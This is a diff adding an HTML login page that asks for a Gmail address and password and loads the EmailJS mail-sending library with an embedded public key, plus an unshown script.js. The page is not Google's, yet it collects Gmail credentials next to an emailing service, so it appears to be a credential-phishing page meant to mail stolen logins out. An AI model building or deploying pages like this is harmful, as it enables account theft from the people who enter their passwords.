@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <h1>Login</h1>
+        <form id="loginForm">
+            <label for="username">Gmail:</label>
+            <input type="email" id="username" name="username" required pattern="[a-zA-Z0-9._%+-]+@gmail\.com">
+            
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required minlength="6">
+            
+            <button type="submit">Login</button>
+        </form>
+        <div id="output"></div>
+    </div>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("M9OnFP_WXRSFUoD0J"); // Replace with your EmailJS public key
+        })();
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
